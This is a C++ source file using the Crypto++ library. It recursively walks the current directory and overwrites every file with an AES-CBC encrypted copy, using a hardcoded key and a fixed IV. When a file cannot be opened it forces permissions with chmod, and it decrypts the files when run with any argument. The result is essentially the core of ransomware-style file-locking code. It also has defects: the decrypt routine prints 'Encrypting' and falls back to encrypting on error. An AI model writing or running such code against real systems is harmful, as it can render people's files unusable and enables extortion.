#include <cryptopp/aes.h>
#include <cryptopp/files.h>
#include <cryptopp/modes.h>
#include <cryptopp/channels.h>

#include <experimental/filesystem>
#include <string>
#include <sys/stat.h>

namespace fs = std::experimental::filesystem;

void encrypt(const char filename[], const std::string &pwd){
    const char temp_filename[] = "temp";
    try {
        std::cout << "Encrypting: " << filename << std::endl;

        CryptoPP::byte iv[16];
        memset(iv, 0x01, 16);

        CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption encryptor((CryptoPP::byte *) &pwd[0], pwd.size(), iv);

        CryptoPP::StreamTransformationFilter filter(encryptor, new CryptoPP::FileSink(temp_filename));
        CryptoPP::ChannelSwitch channel_switch;
        channel_switch.AddDefaultRoute(filter);

        CryptoPP::FileSource(filename, true, new CryptoPP::Redirector(channel_switch));
        CryptoPP::FileSource(temp_filename, true, new CryptoPP::FileSink(filename));
    } catch (CryptoPP::FileStore::OpenErr &err) {
        std::cerr << err.what() << std::endl;
        chmod(filename, S_IRWXU);
        encrypt(filename, pwd);
    } catch (CryptoPP::Exception &err) {
        fs::remove(temp_filename);
    }
    fs::remove(temp_filename);
}


void decrypt(const char filename[], const std::string &pwd){
    const char temp_filename[] = "temp";
    try {
        std::cout << "Encrypting: " << filename << std::endl;

        CryptoPP::byte iv[16];
        memset(iv, 0x01, 16);

        CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption decryptor((CryptoPP::byte *) &pwd[0], pwd.size(), iv);

        CryptoPP::StreamTransformationFilter filter(decryptor, new CryptoPP::FileSink(temp_filename));
        CryptoPP::ChannelSwitch channel_switch;
        channel_switch.AddDefaultRoute(filter);

        CryptoPP::FileSource(filename, true, new CryptoPP::Redirector(channel_switch));
        CryptoPP::FileSource(temp_filename, true, new CryptoPP::FileSink(filename));
    } catch (CryptoPP::FileStore::OpenErr &err) {
        std::cerr << err.what() << std::endl;
        chmod(filename, S_IRWXU);
        encrypt(filename, pwd);
    } catch (CryptoPP::Exception &err) {
        fs::remove(temp_filename);
    }
    fs::remove(temp_filename);
}


int main(int argc, char **argv) {
    const std::string pwd = "12345678901234567890123456789012";

    if (argc == 1) {
        for (const fs::directory_entry &i : fs::recursive_directory_iterator("."))
            if (!fs::is_directory(i.path()))
                encrypt(i.path().string().c_str(), pwd);
    } else {
        for (const fs::directory_entry &i : fs::recursive_directory_iterator("."))
            if (!fs::is_directory(i.path()))
                decrypt(i.path().string().c_str(), pwd);
    }
}